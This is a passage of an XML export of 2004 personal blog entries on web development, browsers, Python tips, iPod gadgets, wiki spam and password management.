		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I've been thinking about per-site user stylesheets &lt;a href=&quot;http://simon.incutio.com/archive/2004/07/15/persite&quot; title=&quot;Per-site user stylesheets&quot;&gt;for a while now&lt;/a&gt;, but my colleague Adrian has gone one better: his &lt;a href=&quot;http://www.holovaty.com/blog/archive/2004/07/19/2210&quot;&gt;All Music Guide Corrector&lt;/a&gt; extension for Firefox fixes their horrible JavaScript links, hides the useless Flash navigation and improves their unpopular &quot;read more&quot; links, causing them to load content on the current page rather than navigating to a new page entirely.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I believe that extensions like this have a significant role to play. Bugzilla's &lt;a href=&quot;http://bugzilla.mozilla.org/buglist.cgi?product=Tech+Evangelism&quot;&gt;Tech Evangelism&lt;/a&gt; project is overflowing with badly designed sites that through ignorance or choice refuse to work with standards compliant browsers, many of which have &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=80479#c15&quot; title=&quot;Odeon&amp;apos;s bad JavaScript was patched two years ago&quot;&gt;available patches&lt;/a&gt; just waiting to be implemented. Per-site extensions at least allow users to choose to fix the problem locally and route around the damage - and their use should send a powerful message to the sites in question.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;This kind of extension also introduces some interesting questions. How will site owners react to their users tweaking their websites in this way? Is it ethical to modify a site without the user's permission to improve functionality? What about to block irritating ads?&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Pop-up blockers have only scratched the surface. Let's see some innovation.&lt;/p&gt;</field>
		<field name="created">2004-07-20 05:46:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1436</field>
		<field name="title">Jimmy Wales on battling wiki spam</field>
		<field name="slug">jimmy</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Jimmy Wales of &lt;a href=&quot;http://www.wikipedia.org/&quot;&gt;Wikipedia&lt;/a&gt; was &lt;a href=&quot;http://slashdot.org/article.pl?sid=04/07/28/1351230&quot; title=&quot;Wikipedia Founder Jimmy Wales Responds&quot;&gt;interviewed recently&lt;/a&gt; by the Slashdot community. One of the questions regarded protecting Wikis from spammers:&lt;/p&gt;

&lt;blockquote cite=&quot;http://slashdot.org/article.pl?sid=04/07/28/1351230&quot;&gt;&lt;p id=&quot;p-1&quot;&gt;Sure, I think it's pretty simple to solve problems like that. One of the first tricks I would try is to parse the wiki text that someone inputs to see if it contains an external link. If so, then only in those cases, require an answer to a captcha.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Second step, keep editing wide open for everyone, but restrict the ability to post external links to people who are trusted by that community. Make it really easy for trusted users to extend the zone of trust, because you want to encourage participation.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Basically what I think works in a wikis is to trust people to do the right thing, and trust them as much as you can possibly stand it, until it hurts your head and makes you scared for what they're going to break. Because that is what works.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;People are not fundamentally bad. It only takes the smallest of correctives to take care of that tiny minority that wants to disrupt the community.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p id=&quot;p-5&quot;&gt;I'm glad to say that so far the &lt;a href=&quot;http://simon.incutio.com/archive/2004/04/27/wikiSpam&quot;&gt;css-discuss wiki spam problem&lt;/a&gt; has been effectively tackled by a hard working group of dedicated spam fighters. Helping out is as easy as signing  up for the &lt;a href=&quot;http://css-discuss.incutio.com/?action=rss&quot;&gt;recent changes RSS feed&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-07-29 02:38:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1437</field>
		<field name="title">Improving online credibility</field>
		<field name="slug">credibility</field>
		<field name="body">&lt;p&gt;If you've browsed Amazon's product reviews recently you may have noticed an interesting new feature: &lt;a href=&quot;http://www.amazon.com/exec/obidos/tg/browse/-/13158871/&quot;&gt;Badges&lt;/a&gt;, little icons displayed below certain people's names. This isn't a new idea by any means - many online communities use special icons as rewards for members who make valuable contributions (&lt;a href=&quot;http://www.sitepoint.com/&quot;&gt;SitePoint&lt;/a&gt; is a good example). What's interesting about Amazon's badges is that one of them is &quot;Real Name&quot;. Amazon's &lt;a href=&quot;http://www.amazon.com/exec/obidos/tg/browse/-/12986081/&quot;&gt;Real Names FAQ&lt;/a&gt; explains the badge, and includes the following:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.amazon.com/exec/obidos/tg/browse/-/12986081/&quot;&gt;
&lt;p&gt;&lt;strong&gt;Why is Amazon.com encouraging the use of Real Names?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In general, we believe that a community in which people use their Real Names will ultimately have higher quality content, since an author willing to sign his or her real-world name on a piece of content is essentially saying &quot;With my real-world identity, I stand by what I have written here.&quot;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Real names certainly add credibility to online discussion: I for one find it much easier to trust information if the author appears to have signed their real name to it. The challenge is verifying that the name is accurate, and Amazon's solution is so simple-but-smart that I kicked myself: they match the name against the user's credit card details. Genius.&lt;/p&gt;

&lt;p&gt;I wouldn't be surprised to see this trick taking on a key role in the field of online identity management - provided Amazon's patent lawyers don't get there first.&lt;/p&gt;</field>
		<field name="created">2004-07-29 05:45:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1438</field>
		<field name="title">Early adoption, and Airport Express cut-outs</field>
		<field name="slug">airport</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I don't know quite how I did it, but in the past 48 hours I've become an Apple early adopter. I spent the weekend in Minnesota, where a visit to the Mall of America (aka Unholy Temple to Consumerism) resulted in a visit to the &lt;a href=&quot;http://www.apple.com/retail/mallofamerica/&quot;&gt;Apple store&lt;/a&gt;, and a visit to the Apple store resulted in a shiny new fourth generation 20 GB iPod. Of course, the seven and a half hour journey back south would go so much faster with an &lt;a href=&quot;http://www.griffintechnology.com/products/itrip/&quot;&gt;iTrip&lt;/a&gt; to play with, so I picked one of those up as well.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The Apple store also provided me with the most intensely Apple moment of my life, when I overheard a store employee in a blue t-shirt, with blue hair, holding a blue mini iPod, telling a customer: &quot;Oh, and of course there's the 'cool' factor&quot;.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;The iPod is a lot of fun, especially now that I've enabled it as a hard drive (through an option hidden in iTunes for some reason) and started messing around with it at the command line. Here's an iPod tip: if you want to access the music files stored on the device, open up a terminal and &lt;samp&gt;cd&lt;/samp&gt; to &lt;samp&gt;/Volumes/iPod/iPod_Control/Music&lt;/samp&gt;. The Finder won't display the files (presumably as a nod to the music industry's legal eagles) but you can still get at them using good old fashioned Unix commands. The next step is to set up some kind of automated backup script for all my other important files.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Another iPod trick for the thrifty: if 20+ dollars seems too much for a case, a sock makes an excellent low budget alternative.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Gadget number two was ordered nearly a month ago, but arrived this morning: an &lt;a href=&quot;http://www.apple.com/airportexpress/&quot;&gt;Airport Express&lt;/a&gt;. If Gartner &lt;a href=&quot;http://www.theregister.co.uk/2004/07/07/ipod_security_risks/&quot;&gt;thought that the iPod was a corporate security risk&lt;/a&gt; they're going to have a field day with this thing: it's the size of a power brick, and setting up wireless access to a network is as easy as plugging in an ethernet cable and hooking it up to a power socket. It's an instant network hole in the palm of your hand.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Mine's now doing service as a wireless speaker cable (to a set of &lt;a href=&quot;http://www.amazon.com/exec/obidos/tg/detail/-/B00006IRR4/&quot;&gt;JBL Creature Speakers&lt;/a&gt;), and have actually just started randomly cutting out. Here's hoping it's just a temporary glitch. I'm also crossing my fingers for Apple to release a software update that lets me channel all of the sound output from my laptop through the Airport Express, rather than just music from iTunes.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;Actually, the random cut outs are getting really irritating now. Any other early adopters experienced this problem?&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; Turning off the &quot;Use Inteference Robustness&quot; option for my AirPort card seems to have fixed the cut outs. Update a few minutes later: nope, they're back with a vengeance. Not good.&lt;/p&gt;</field>
		<field name="created">2004-08-03 05:02:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1439</field>
		<field name="title">Participatory journalism</field>
		<field name="slug">participatory</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Participatory (or citizen) journalism is getting a lot of coverage at the moment, thanks in part to Dan Gillmor's new book &lt;a href=&quot;http://wethemedia.oreilly.com/&quot;&gt;We the Media&lt;/a&gt;. For a great example of participatory journalism in action, check out Wikipedia's outstanding coverage of the &lt;a href=&quot;http://en.wikipedia.org/wiki/2004_Summer_Olympics#Events&quot;&gt;2004 Summer Olympics&lt;/a&gt;. It's already a serious competitor to the &lt;a href=&quot;http://www.athens2004.com/en/&quot; title=&quot;Athens 2004&quot;&gt;official site&lt;/a&gt; in terms of content, and its wiki nature means it will only get better as the games continue. Hat tip: &lt;a href=&quot;http://www.gadgetopia.com/2004/08/16/OlympicCoverageAtWikipedia.html&quot; title=&quot;&quot;&gt;Gadgetopia&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I've been a fan of Wikipedia's &lt;a href=&quot;http://en.wikipedia.org/wiki/Current_events&quot;&gt;current affairs coverage&lt;/a&gt; for quite a while. The site is especially useful in catching up with ongoing stories, in particular for detailed profiles of people and groups currently making the news (random example: &lt;a href=&quot;http://en.wikipedia.org/wiki/Muqtada_al-Sadr&quot;&gt;Muqtada al-Sadr&lt;/a&gt;). Despite the site's open nature (or maybe because of it), they generally do an excellent job of keeping to a &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:Neutral_point_of_view&quot;&gt;neutral point of view&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Citizen journalism is unlikely to ever replace traditional journalism completely, but it can certainly enhance it. Then again, with &lt;a href=&quot;http://www.ohmynews.com/&quot;&gt;OhMyNews&lt;/a&gt; now one of the most influential media outlets in Korea (see &lt;a href=&quot;http://www.guardian.co.uk/online/story/0,3605,1266031,00.html&quot; title=&quot;Hacks of all trades &quot;&gt;this interview&lt;/a&gt; for details) this is one trend that's not going to go away.&lt;/p&gt;</field>
		<field name="created">2004-08-16 17:48:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1440</field>
		<field name="title">Site specific stylesheets in Mozilla</field>
		<field name="slug">specific</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;New in &lt;a href=&quot;http://www.mozilla.org/releases/mozilla1.8a3/README.html&quot;&gt;Mozilla 1.8 Alpha 3&lt;/a&gt;: bug 238099 - &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=238099&quot;&gt;implement at-rule for matching on site/document URL&lt;/a&gt;. Here's the example:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;@-moz-document url-prefix(http://www.mozilla.org/) {
  #q { background: white ! important; color: black ! important; }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-1&quot;&gt;Drop that in your &lt;a href=&quot;http://texturizer.net/firefox/edit.html&quot; title=&quot;Firefox Help: Editing Configuration Files&quot;&gt;userContent.css file&lt;/a&gt; for black-on-white search fields, but only for pages with &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s starting in &lt;samp&gt;http://www.mozilla.org/&lt;/samp&gt;. Two other selection functions are available: &lt;code class=&quot;css&quot;&gt;domain(mozilla.org)&lt;/code&gt; for all page (and sub-domains) of the mozilla.org domain and &lt;code&gt;url(http://www.mozilla.org/)&lt;/code&gt; for just the page matching that exact &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;The sooner this makes it in to Firefox the better.&lt;/p&gt;</field>
		<field name="created">2004-08-19 03:33:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1441</field>
		<field name="title">A snarky note from the administrator</field>
		<field name="slug">snarky</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;No, you &lt;a href=&quot;http://simon.incutio.com/archive/2004/06/18/invites&quot;&gt;can't have a Gmail invite&lt;/a&gt;. No, I &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/05/rememberingPasswords&quot;&gt;won't hack your email account&lt;/a&gt; for you. And if you &lt;a href=&quot;http://simon.incutio.com/archive/2003/12/02/gotmail&quot;&gt;can't find your hotmail inbox&lt;/a&gt;, you shouldn't be using a computer.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Semantic &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; is a two-edged sword.&lt;/p&gt;</field>
		<field name="created">2004-08-23 14:59:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1442</field>
		<field name="title">1000th Blogmark</field>
		<field name="slug">milestone</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I just posted my 1000th &lt;a href=&quot;http://simon.incutio.com/blogmarks/&quot;&gt;blogmark&lt;/a&gt;. I can't emphasize enough how much of an impact this &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/24/blogmarks&quot;&gt;15 minute hack&lt;/a&gt; has had on both my browsing and my blogging habits. While I still tend to leave browser windows open for days at a time, I now at least have a procedure for getting rid of the ones that still interest me. More importantly, having blogmarks has eliminated the temptation to write a full blog entry (with quotation) just to share a link. This has dramatically reduced my posting rate, but has meant that when I do post an entry I usually have something moderately interesting to say.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;To celebrate this personal milestone, I've linked up the rudimentary LIKE query search engine I've been using for a while on the blogmarks index page. My long term aim is still to integrate them with my main content and add comments in the style of &lt;a href=&quot;http://photomatt.net/&quot;&gt;photomatt&lt;/a&gt;, but that would require more time spent hacking on my blogging system (or switching to &lt;a href=&quot;http://wordpress.org/&quot;&gt;WordPress&lt;/a&gt;) than I have to spend right now.&lt;/p&gt;</field>
		<field name="created">2004-08-26 00:30:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1443</field>
		<field name="title">How to track an RSS feed</field>
		<field name="slug">track</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;According to the &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; specification, RSS/Atom aggregators should obey the &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; &lt;samp&gt;301 Moved Permanently&lt;/samp&gt; header by altering the stored subscription &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; for the feed they are attempting to retrieve.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;This behaviour can be used to track repeat aggregator hits to a feed, in essence the equivalent a setting a permanent cookie. The first time an aggregator hits the published feed address, a 301 header is served redirecting that aggregator to a new &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; incorporating a unique ID. The aggregator permanently changes the stored subscription &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;, meaning future request to that feed will carry the unique ID that was assigned the first time the feed was retrieved.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;At its most innocent, this could allow people to track their number of unique subscriptions - although the value of this would be severely diluted if people started deliberately subscribing to the same redirected feed &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;. I'm sure there are more insidious uses for this as well.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Maybe aggregators should prompt users when a feed has permanently moved, to prevent them from being tracked without their knowledge.&lt;/p&gt;</field>
		<field name="created">2004-09-01 00:53:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1444</field>
		<field name="title">The bookmarklet solution to the password problem</field>
		<field name="slug">problem</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Anyone who makes heavy use of the internet has run in to the password problem: dozens of user accounts on sites with varying degrees of trustability, leading to an unmanageable proliferation of username and password combinations. The temptation is to use the same combination on multiple sites, but doing so opens you up to the horrifying prospect of a security flaw in one site compromising al of your other accounts.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I was burnt by this a few years ago: a small community forum on which I was a member was cracked, and my account was then used to log in to another larger forum   to which I had administrator acccess. Thankfully no permanent damage was done, but it taught me a valuable lesson in password security. Since then I've maintained a number of different combinations each with a different level of associated trust: if my account on Joe's random forum is cracked it won't lead to the compromise of my Amazon account!&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Even different tiers of passwords aren't ideal though, and that's why Nic Wolff's &lt;a href=&quot;http://angel.net/~nic/passwdlet.html&quot;&gt;Password generator bookmarklet&lt;/a&gt; (via &lt;a href=&quot;http://merlin.blogs.com/43folders/2004/09/make_your_secur.html&quot; title=&quot;Make your security answer a little weirder&quot;&gt;43 Folders&lt;/a&gt;) has me so excited. Nic's bookmarklet pops up a JavaScript prompt box asking for your &quot;master&quot; password, then MD5s it against the domain of the current login page and inserts the resulting hash in to any password fields on the page. A single password can be used for dozens of sites without any risk of a compromise of one account affecting the others. It's brilliant.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;There are a couple of minor flaws in the bookmarklet: the master password prompt is in plain text rather than masking your input with asterisks, and the bookmarklet could leave you high and dry if a site changes the domain on which their login form resides without you noticing. The first could be solved by extending the bookmarklet to append a &quot;master password&quot; field to the page using the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;, while a solution to the second would require some kind of server-side store of the domains at which the initial accounts were created.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Quibbles aside, it's an ingenious solution to a pervasive problem.&lt;/p&gt;</field>
		<field name="created">2004-09-06 19:49:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1445</field>
		<field name="title">Command line blacklisting</field>
		<field name="slug">commandline</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Just over a year ago, &lt;a href=&quot;http://simon.incutio.com/archive/2003/09/02/blacklisting&quot; title=&quot;Blacklisting Comment Spam&quot;&gt;I started blacklisting&lt;/a&gt; domain names from links featured in comment spam. My idea then was that these blacklists could become a shared resource: people would publish their own blacklist and subscribe to those of people they trust, thus making it much harder for spammers to operate. While the sheer volume of spam domains meant that the technique was much less useful than I originally anticipated, I've continued to maintain my blacklist ever since as a preventative measure against repeat spammers.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I have a confession to make: all of my blog administration (with the exception of adding entries and blogmarks) is performed using &lt;a href=&quot;http://www.phpmyadmin.net/&quot;&gt;phpMyAdmin&lt;/a&gt;. The trouble with writing your own software is that it's very easy to skimp on the backend tools, since you're the only person who will ever see them. Incidentally, this is the main reason I plan to switch to &lt;a href=&quot;http://wordpress.org/&quot;&gt;WordPress&lt;/a&gt; just as soon as I find the inspiration to write the necessary import scripts. Comments are deleted in phpMyAdmin, and domains are blacklisted by manually editing the &lt;a href=&quot;http://simon.incutio.com/blacklist.txt&quot;&gt;blacklist.txt&lt;/a&gt; file via &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt;.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;This has been really bugging me, especially since I have so little other use for &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; that my only installed client is an unregistered version of &lt;a href=&quot;http://www.panic.com/transmit/&quot;&gt;Transmit&lt;/a&gt; (closes after ten minutes, won't save passwords along with account details). I've been muddling along with that for longer than I care to admit, but today I decided to take 10 minutes out to solve the problem once and for all. I could have put together a web interface for adding new domains but I wasn't really in the mood, so I decided to put time spent reading &lt;a href=&quot;http://www.faqs.org/docs/artu/&quot;&gt;&lt;cite&gt;The Art of Unix Programming&lt;/cite&gt;&lt;/a&gt; to good use and knock out a simple command line application.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;The result (minus my login details) can be found &lt;a href=&quot;http://simon.incutio.com/code/python/blacklist.py&quot; title=&quot;blacklist.py&quot;&gt;here&lt;/a&gt;. Sample usage: &lt;samp&gt;./blacklist.py www.domain.org www.domain2.com&lt;/samp&gt;. It follows the Unix ideal of being the simplest-thing-that-could-possibly-work, and ended up taking longer to write than I expected thanks mainly to the craziness of Python's &lt;a href=&quot;http://www.python.org/doc/current/lib/module-ftplib.html&quot;&gt;ftplib&lt;/a&gt;. I've seen complaints about this before, and it thoroughly deserves its bad reputation.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Here's one example: &lt;code&gt;retrlines&lt;/code&gt; is the method used to retrieve ascii text from the server. Bizzarely, it doesn't actually return the text receieved; instead, it expects you to provide it with a callback function that will be fed each line in turn, minus the newline. Sounds like a job for &lt;a href=&quot;http://www.python.org/doc/current/lib/module-StringIO.html&quot;&gt;StringIO&lt;/a&gt;, but &lt;code&gt;StringIO&lt;/code&gt; objects don'y have a writeline method (required to add the newline back on). I ended up writing my own extension of the &lt;code&gt;StringIO2&lt;/code&gt; class and adding a writeline method just to preserve the newlines returned from the server!&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Strange &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt;s aside, I'm pretty pleased with the final result. It follows a bunch of Unix design patterns (and skips others such as those related to configuration, but I'm not overly bothered about those) including the following:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;A usage note is displayed if no arguments are provided.&lt;/li&gt;
 &lt;li&gt;Multiple domains can be blacklisted at once, by providing them as multiple command line arguments.&lt;/li&gt;
 &lt;li&gt;Domains that are already in the blacklist are skipped, and a message is written to standard error.&lt;/li&gt;
 &lt;li&gt;If the script suceeds, it doesn't say anything at all.&lt;/li&gt;
&lt;/ol&gt;

&lt;p id=&quot;p-6&quot;&gt;It also uses the common Python idiom of wrapping the principle logic in a function and then calling that from a block that runs only if the file is executed directly (the &lt;a href=&quot;http://www.artima.com/weblogs/viewpost.jsp?thread=4829&quot; title=&quot;Guido van Rossum: Python main() functions&quot;&gt;&lt;code&gt;__name__ == '__main__'&lt;/code&gt; idiom&lt;/a&gt;) so that other Python code can import the module and reuse its functionality if required.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;There's plenty of room for improvement: being able to pipe a list of domains in via standard input would be nice, and hard coding the (unencrypted) username and password is sloppy (as is expecting the blacklist.txt file to live in the &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; home directory). Even better, with &lt;acronym title=&quot;Secure SHell&quot;&gt;SSH&lt;/acronym&gt; access the whole thing could be replaced with an infinitely more secure one-liner: &lt;code class=&quot;bash&quot;&gt;echo www.domain-to-ban.org | ssh username@server &quot;cat - &amp;gt;&amp;gt; blacklist.txt&quot;&lt;/code&gt;. I'm happy though: an irritating task has become much less irritating and I have some example code to fall back on next time I need to get mucky with &lt;code&gt;ftplib&lt;/code&gt;.&lt;/p&gt;</field>
		<field name="created">2004-09-09 05:59:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1446</field>
		<field name="title">Browser innovation is alive and well</field>
		<field name="slug">liveBookmarks</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Here's a feature that caught me by surprise (maybe I haven't been keeping my ear close enough to the ground): the new &lt;a href=&quot;http://www.mozilla.org/products/firefox/releases/0.10.html&quot; title=&quot;Firefox 1.0 PR Release Notes&quot;&gt;Firefox 1.0 preview release&lt;/a&gt; supports &lt;a href=&quot;http://www.mozilla.org/products/firefox/live-bookmarks.html&quot;&gt;&lt;em&gt;Live Bookmarks&lt;/em&gt;&lt;/a&gt;, a novel twist on &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; aggregators where feeds look just like bookmark folders, displaying a list of bookmarks corresponding to the headlines from the feed. Best of all, the feature support &lt;a href=&quot;http://diveintomark.org/archives/2002/05/30/rss_autodiscovery&quot;&gt;RSS autodiscovery&lt;/a&gt;. Sites with auto-discoverable feeds display an attractive &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; icon on the right hand side of the status bar, allowing for one click subscriptions.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;There are certainly some issues to be ironed out. Subscribing to a feed without auto-discovery isn't very easy, as the &quot;New Live Bookmark&quot; button is missing from the bookmark manager's toolbar (look in the File menu there instead). I also haven't found the interface for setting subscription options such as polling intervals, so I'll have to trust that Firefox is doing more or less the right thing. Those points aside, it's great to see Firefox driving forward browser innovation yet again.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; Here's a killer app for this feature: if you use &lt;a href=&quot;http://simon.incutio.com/blogmarks/&quot;&gt;blogmarks&lt;/a&gt;/&lt;a href=&quot;http://diveintomark.org/archives/blinks/&quot;&gt;b-links&lt;/a&gt;/&lt;a href=&quot;http://del.icio.us/&quot;&gt;del.icio.us&lt;/a&gt; instead of bookmarks, subscribing to the accompanying &lt;acronym title=&quot;Really Simply Syndication&quot;&gt;RSS&lt;/acronym&gt; feed as a live bookmark will give you access to your most recently added items within the browser &lt;acronym title=&quot;User Interface&quot;&gt;UI&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2004-09-14 16:28:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1447</field>
		<field name="title">Matching newlines in JavaScript</field>
		<field name="slug">newlines</field>
		<field name="body">&lt;p&gt;Just a quick note: the &lt;code class=&quot;javascript&quot;&gt;.&lt;/code&gt; character in a JavaScript regular expression will &lt;em&gt;never&lt;/em&gt; match a newline character. If you want to match any character including newlines you can use the &lt;code class=&quot;javascript&quot;&gt;[\s\S]&lt;/code&gt; character class instead, which means &quot;any character that's either whitespace or not whitespace&quot;.&lt;/p&gt;

&lt;p&gt;This differs from both Python and Perl, where regular expression flags can be used to alter the behaviour of the . character (&lt;code class=&quot;python&quot;&gt;re.DOTALL&lt;/code&gt; and &lt;code class=&quot;perl&quot;&gt;/s&lt;/code&gt; respectively).&lt;/p&gt;

&lt;p&gt;This tip courtesy of the denizens of &lt;samp&gt;#javascript&lt;/samp&gt; on &lt;a href=&quot;http://freenode.net/&quot;&gt;Freenode&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-09-20 22:52:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1448</field>
		<field name="title">Python2.4 highlights</field>
		<field name="slug">python24</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;A.M. Kuchling's &quot;What's New in Python X&quot; documents are always a treat, and his &lt;a href=&quot;http://www.python.org/dev/doc/devel/whatsnew/whatsnew24.html&quot;&gt;guide to the forthcoming Python 2.4&lt;/a&gt; is no exception. Among other things, 2.4 &lt;a href=&quot;http://www.python.org/dev/doc/devel/whatsnew/node2.html&quot; title=&quot;1 PEP 218: Built-In Set Objects&quot;&gt;elevates sets to built in type status&lt;/a&gt;, dramatically &lt;a href=&quot;http://www.python.org/dev/doc/devel/whatsnew/node11.html&quot; title=&quot;10 Other Language Changes&quot;&gt;improves the usability of Python's list sort method&lt;/a&gt; (for easier application of &lt;acronym title=&quot;Decorate-Sort-Undecorate&quot;&gt;DSU&lt;/acronym&gt;, aka the &lt;a href=&quot;http://www.stonehenge.com/merlyn/UnixReview/col06.html&quot; title=&quot;Unix Review Column 6 (January 1996)&quot;&gt;Schwartzian transform&lt;/a&gt;), makes &lt;a href=&quot;http://www.python.org/dev/doc/devel/whatsnew/node7.html&quot; title=&quot;6 PEP 322: Reverse Iteration&quot;&gt;reverse iteration&lt;/a&gt; easier and introduces &lt;a href=&quot;http://www.python.org/dev/doc/devel/whatsnew/node5.html&quot; title=&quot;4 PEP 292: Simpler String Substitutions&quot;&gt;an alternative string substitution method&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;All that's before you get on to the really exciting stuff: &lt;a href=&quot;http://www.python.org/dev/doc/devel/whatsnew/node4.html&quot; title=&quot;3 PEP 289: Generator Expressions&quot;&gt;generator expressions&lt;/a&gt;, the &lt;a href=&quot;http://www.python.org/dev/doc/devel/whatsnew/node8.html&quot; title=&quot;7 PEP 327: Decimal Data Type&quot;&gt;new decimal type&lt;/a&gt; (because floating point numbers are &lt;a href=&quot;http://docs.python.org/tut/node15.html&quot; title=&quot;B. Floating Point Arithmetic: Issues and Limitations&quot;&gt;such a nuisance&lt;/a&gt;) and the controversial &lt;a href=&quot;http://www.python.org/dev/doc/devel/whatsnew/node6.html&quot; title=&quot;5 PEP 318: Decorators for Functions, Methods and Classes&quot;&gt;function decorators&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;I have to admit I didn't understand the significance of half of this stuff until I read about them in &quot;What's New&quot;, which explains the use-cases for the new features with great clarity.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Python seems to advance at just the right rate; new features are introduced fast enough to keep me interested (and keep the language feeling alive) but not so fast as to leave me feeling left behind.&lt;/p&gt;</field>
		<field name="created">2004-09-21 02:36:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1449</field>
		<field name="title">Running Pydoc under mod_python</field>
		<field name="slug">modpydoc</field>
